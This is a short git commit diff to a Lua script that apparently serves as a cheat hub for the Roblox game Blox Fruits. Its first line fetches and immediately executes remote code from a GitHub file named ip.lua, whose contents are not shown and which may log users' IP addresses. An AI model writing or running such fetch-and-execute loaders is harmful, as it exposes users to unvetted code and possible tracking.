c585df57f81bc23216ec23e9eb6e39f5f4b363ae
xielbers <88589081+xielbers@users.noreply.github.com>
2025-07-18 07:50:53 -0300

    Actualizar blox-fruits_redz-hub.lua

--- blox-fruits_redz-hub.lua
+++ blox-fruits_redz-hub.lua
@@ -1,4 +1,4 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/refs/heads/main/copy/ip.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/refs/heads/main/copy/ip.lua'))("blox-fruits_redz-hub")
 
 local Settings = {
   JoinTeam = "Pirates"; -- Pirates/Marines
